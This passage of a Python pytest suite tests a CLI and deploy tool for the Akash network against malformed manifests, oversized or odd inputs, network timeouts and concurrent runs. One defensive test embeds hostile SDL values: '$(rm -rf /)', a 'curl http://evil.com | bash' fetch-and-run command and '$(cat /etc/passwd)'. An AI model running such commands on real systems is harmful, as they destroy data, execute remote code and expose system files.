    @patch("just_akash.deploy.time")
    @patch("just_akash.deploy.AkashConsoleAPI")
    def test_manifest_is_integer(self, MockAPI, mock_time, tmp_path, monkeypatch):
        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        monkeypatch.delenv("AKASH_PROVIDERS", raising=False)

        sdl_file = tmp_path / "sdl.yaml"
        sdl_file.write_text('version: "2.0"\nservices:\n  web:\n    image: ubuntu\n')

        client = MockAPI.return_value
        # manifest is an integer instead of a string
        client.create_deployment.return_value = {"dseq": "99", "manifest": 42}
        client.get_bids.return_value = [
            {"id": {"provider": "akash1p"}, "price": {"amount": 5, "denom": "uakt"}}
        ]
        client.create_lease.return_value = {}

        counter = [0.0]
        mock_time.time.side_effect = lambda: counter.__setitem__(0, counter[0] + 1) or counter[0]
        mock_time.sleep.return_value = None

        from just_akash.deploy import deploy

        # Should not raise TypeError — should proceed or raise a clean RuntimeError
        try:
            result = deploy(sdl_path=str(sdl_file), bid_wait=10, bid_wait_retry=10)
            # If it succeeds, the manifest coercion worked
            assert result["dseq"] == "99"
        except RuntimeError:
            pass  # A RuntimeError is acceptable; a TypeError is not
        except TypeError as e:
            pytest.fail(f"Bug confirmed: TypeError from len(manifest): {e}")

    @patch("just_akash.deploy.time")
    @patch("just_akash.deploy.AkashConsoleAPI")
    def test_manifest_is_none(self, MockAPI, mock_time, tmp_path, monkeypatch):
        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        monkeypatch.delenv("AKASH_PROVIDERS", raising=False)

        sdl_file = tmp_path / "sdl.yaml"
        sdl_file.write_text('version: "2.0"\nservices:\n  web:\n    image: ubuntu\n')

        client = MockAPI.return_value
        client.create_deployment.return_value = {"dseq": "99", "manifest": None}
        client.get_bids.return_value = [
            {"id": {"provider": "akash1p"}, "price": {"amount": 5, "denom": "uakt"}}
        ]
        client.create_lease.return_value = {}

        counter = [0.0]
        mock_time.time.side_effect = lambda: counter.__setitem__(0, counter[0] + 1) or counter[0]
        mock_time.sleep.return_value = None

        from just_akash.deploy import deploy

        try:
            deploy(sdl_path=str(sdl_file), bid_wait=10, bid_wait_retry=10)
        except RuntimeError:
            pass
        except TypeError as e:
            pytest.fail(f"Bug confirmed: TypeError from len(None): {e}")


# ── New E2E-Style Adversarial Tests ───────────────────────────────────────────


class TestE2eCliWithMalformedInputs:
    """E2E-style tests for CLI with malformed inputs that could cause crashes."""

    def test_cli_with_very_long_dseq(self, monkeypatch, capsys):
        """Test CLI with extremely long dseq that could cause formatting issues."""
        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        long_dseq = "1" * 10000  # 10k character dseq
        monkeypatch.setattr(sys, "argv", ["just-akash", "status", "--dseq", long_dseq])

        from just_akash.cli import main

        with patch.object(AkashConsoleAPI, "get_deployment") as mock_get:
            mock_get.return_value = {"deployment": {"state": "active"}, "leases": []}
            # Should handle long dseq without crashing
            try:
                main()
                captured = capsys.readouterr()
                # CLI may output JSON or table format depending on TTY detection
                assert "active" in captured.out
            except SystemExit as e:
                assert e.code in (0, 1)

    def test_cli_with_unicode_dseq(self, monkeypatch, capsys):
        """Test CLI with Unicode characters in dseq."""
        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        unicode_dseq = "dseq🚀123"
        monkeypatch.setattr(sys, "argv", ["just-akash", "status", "--dseq", unicode_dseq])

        from just_akash.cli import main

        with patch.object(AkashConsoleAPI, "get_deployment") as mock_get:
            mock_get.return_value = {"deployment": {"state": "active"}, "leases": []}
            try:
                main()
                captured = capsys.readouterr()
                # CLI may output JSON or table format depending on TTY detection
                assert "active" in captured.out
            except SystemExit as e:
                assert e.code in (0, 1)

    def test_cli_with_null_byte_in_dseq(self, monkeypatch, capsys):
        """Test CLI with null bytes in dseq - could cause C extension issues."""
        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        malicious_dseq = "123\x00evil"
        monkeypatch.setattr(sys, "argv", ["just-akash", "status", "--dseq", malicious_dseq])

        from just_akash.cli import main

        with patch.object(AkashConsoleAPI, "get_deployment") as mock_get:
            mock_get.return_value = {"deployment": {"state": "active"}, "leases": []}
            try:
                main()
                captured = capsys.readouterr()
                assert "active" in captured.out
            except SystemExit as e:
                assert e.code in (0, 1)

    def test_cli_with_extremely_long_tag_name(self, monkeypatch, capsys):
        """Test CLI tag command with very long tag name."""
        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        long_tag = "a" * 100000  # 100k character tag
        monkeypatch.setattr(
            sys, "argv", ["just-akash", "tag", "--dseq", "12345", "--name", long_tag]
        )

        from just_akash.cli import main

        try:
            main()
            captured = capsys.readouterr()
            # Should either succeed or fail gracefully
            assert "tagged" in captured.out.lower() or "Error" in captured.out
        except SystemExit as e:
            assert e.code in (0, 1)


class TestE2eDeployWithAdversarialSdl:
    """E2E-style tests for deploy command with adversarial SDL files."""

    def test_deploy_with_sdl_containing_shell_commands(self, tmp_path, monkeypatch):
        """Test deploy with SDL that has shell command-like content."""
        from just_akash.deploy import deploy

        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        sdl_file = tmp_path / "sdl.yaml"
        # SDL with content that looks like shell commands
        sdl_content = """
version: "2.0"
services:
  web:
    image: $(rm -rf /)
    command: ["sh", "-c", "curl http://evil.com | bash"]
    env:
      - SECRET=$(cat /etc/passwd)
"""
        sdl_file.write_text(sdl_content)

        with patch("just_akash.deploy.AkashConsoleAPI") as MockAPI:
            client = MockAPI.return_value
            client.create_deployment.return_value = {"dseq": "123", "manifest": "abc"}
            client.get_bids.return_value = []
            client.close_deployment.return_value = {}

            # Should not execute shell commands, just validate SDL
            with pytest.raises(RuntimeError):
                deploy(sdl_path=str(sdl_file), bid_wait=0, bid_wait_retry=0)

    def test_deploy_with_extremely_large_sdl(self, tmp_path, monkeypatch):
        """Test deploy with very large SDL file."""
        from just_akash.deploy import deploy

        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        sdl_file = tmp_path / "sdl.yaml"

        # Create a very large SDL (10MB)
        large_service = (
            "  web:\n    image: ubuntu\n"
            + "    env:\n"
            + "\n".join([f"      - VAR{i}=value{i}" for i in range(100000)])
        )
        sdl_content = f'version: "2.0"\nservices:\n{large_service}\n'
        sdl_file.write_text(sdl_content)

        with patch("just_akash.deploy.AkashConsoleAPI") as MockAPI:
            client = MockAPI.return_value
            client.create_deployment.return_value = {"dseq": "123", "manifest": "abc"}
            client.get_bids.return_value = []

            # Should handle large file without memory issues
            with pytest.raises(RuntimeError, match="No bids"):
                deploy(sdl_path=str(sdl_file), bid_wait=0, bid_wait_retry=0)

    def test_deploy_with_sdl_containing_circular_references(self, tmp_path, monkeypatch):
        """Test deploy with SDL that has circular YAML references."""
        from just_akash.deploy import deploy

        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        sdl_file = tmp_path / "sdl.yaml"

        # YAML with potential circular reference
        sdl_content = """
version: "2.0"
services:
  web: &web
    image: ubuntu
    depends_on:
      - *web
"""
        sdl_file.write_text(sdl_content)

        with patch("just_akash.deploy.AkashConsoleAPI") as MockAPI:
            client = MockAPI.return_value
            client.create_deployment.return_value = {"dseq": "123", "manifest": "abc"}
            client.get_bids.return_value = []

            # Should handle YAML parsing gracefully
            with pytest.raises(RuntimeError):
                deploy(sdl_path=str(sdl_file), bid_wait=0, bid_wait_retry=0)

    def test_deploy_with_sdl_containing_invalid_yaml(self, tmp_path, monkeypatch):
        """Test deploy with malformed YAML."""
        from just_akash.deploy import deploy

        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        sdl_file = tmp_path / "sdl.yaml"

        # Invalid YAML with unmatched brackets
        sdl_content = """
version: "2.0"
services:
  web:
    image: ubuntu
    env:
      - VAR=[unclosed
"""
        sdl_file.write_text(sdl_content)

        with patch("just_akash.deploy.AkashConsoleAPI"), pytest.raises((RuntimeError, Exception)):
            # Should fail during SDL processing
            deploy(sdl_path=str(sdl_file), bid_wait=0, bid_wait_retry=0)


class TestE2eNetworkEdgeCases:
    """E2E-style tests for network-related edge cases."""

    @patch("just_akash.api.urllib.request.urlopen")
    def test_network_timeout_during_deployment_creation(self, mock_urlopen):
        """Test handling of network timeouts during critical operations."""
        import urllib.error

        # First call succeeds (deployment creation), second fails (bid polling)
        mock_resp_success = MagicMock()
        mock_resp_success.read.return_value = b'{"dseq": "12345", "manifest": "abc"}'
        mock_resp_success.status = 200
        mock_resp_success.__enter__ = lambda s: s
        mock_resp_success.__exit__ = MagicMock(return_value=False)

        mock_resp_timeout = MagicMock()
        mock_resp_timeout.__enter__ = MagicMock(side_effect=urllib.error.URLError("Timeout"))

        mock_urlopen.side_effect = [mock_resp_success, mock_resp_timeout]

        client = AkashConsoleAPI("key")

        # Create deployment succeeds
        result = client.create_deployment("sdl")
        assert result["dseq"] == "12345"

        # Get bids fails with timeout
        with pytest.raises(RuntimeError):
            client.get_bids("12345")

    @patch("just_akash.api.urllib.request.urlopen")
    def test_ssl_certificate_validation_bypass(self, mock_urlopen):
        """Test that SSL certificates are properly validated (or not bypassed)."""
        # This is more of a configuration test
        client = AkashConsoleAPI("key")

        # The urllib request should use default SSL context
        # In a real scenario, we'd test with invalid certificates
        # For now, just ensure the request setup doesn't have obvious bypasses
        assert client.base_url.startswith("https://")


class TestE2eConcurrentOperations:
    """E2E-style tests for concurrent operations that could cause race conditions."""

    def test_concurrent_deploy_operations_simulation(self, tmp_path, monkeypatch):
        """Simulate concurrent deploy operations."""
        import threading

        from just_akash.deploy import deploy

        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        monkeypatch.delenv("AKASH_PROVIDERS", raising=False)

        results = []
        errors = []

        def deploy_instance(instance_id):
            try:
                sdl_file = tmp_path / f"sdl_{instance_id}.yaml"
                sdl_file.write_text(
                    f'version: "2.0"\nservices:\n  web{instance_id}:\n    image: ubuntu\n'
                )

                with patch("just_akash.deploy.AkashConsoleAPI") as MockAPI:
                    client = MockAPI.return_value
                    client.create_deployment.return_value = {
                        "dseq": f"{instance_id}000",
                        "manifest": "abc",
                    }
                    client.get_bids.return_value = [
                        {"id": {"provider": "p"}, "price": {"amount": 10}}
                    ]
                    client.create_lease.return_value = {}

                    result = deploy(sdl_path=str(sdl_file), bid_wait=10, bid_wait_retry=10)
                    results.append(result)
            except Exception as e:
                errors.append(str(e))

        # Start multiple concurrent deployments
        threads = []
        for i in range(5):
            t = threading.Thread(target=deploy_instance, args=(i,))
            threads.append(t)
            t.start()

        for t in threads:
            t.join(timeout=30)  # 30 second timeout

        # Should have some successful deployments
        assert len(results) > 0 or len(errors) > 0  # At least some activity
        # No crashes should occur
        assert not any("AttributeError" in err or "TypeError" in err for err in errors)


class TestE2eLargeScaleDataHandling:
    """E2E-style tests for handling large amounts of data."""

    def test_list_deployments_with_thousands_of_results(self, monkeypatch, capsys):
        """Test listing thousands of deployments."""
        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        monkeypatch.setattr(sys, "argv", ["just-akash", "list"])

        from just_akash.cli import main

        with patch.object(AkashConsoleAPI, "list_deployments") as mock_list:
            # Return 5000 deployments
            deployments = [
                {"dseq": str(i), "deployment": {"state": "active"}, "leases": []}
                for i in range(5000)
            ]
            mock_list.return_value = deployments

            # Should handle large lists without crashing
            try:
                main()
                captured = capsys.readouterr()
                # CLI may output JSON or table format depending on TTY detection
                assert "active" in captured.out
            except SystemExit as e:
                assert e.code in (0, 1)

    def test_status_with_massive_deployment_response(self, monkeypatch, capsys):
        """Test status with extremely large deployment response."""
        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        monkeypatch.setattr(sys, "argv", ["just-akash", "status", "--dseq", "12345"])

        from just_akash.cli import main

        with patch.object(AkashConsoleAPI, "get_deployment") as mock_get:
            # Create a massive deployment response with many services, leases, etc.
            massive_response = {
                "deployment": {"state": "active"},
                "leases": [
                    {
                        "status": {
                            "services": {
                                f"service{i}": {"ready_replicas": 1, "total": 1}
                                for i in range(1000)
                            },
                            "forwarded_ports": {
                                f"svc{i}": [
                                    {"port": 80 + i, "host": "1.2.3.4", "externalPort": 8080 + i}
                                ]
                                for i in range(100)
                            },
                        }
                    }
                ],
                "escrow_account": {
                    "state": {
                        "funds": [{"amount": str(i * 1000), "denom": "uakt"} for i in range(1000)]
                    }
                },
            }
            mock_get.return_value = massive_response

            # Should handle massive response without crashing
            try:
                main()
                captured = capsys.readouterr()
                assert "active" in captured.out
            except SystemExit as e:
                assert e.code in (0, 1)
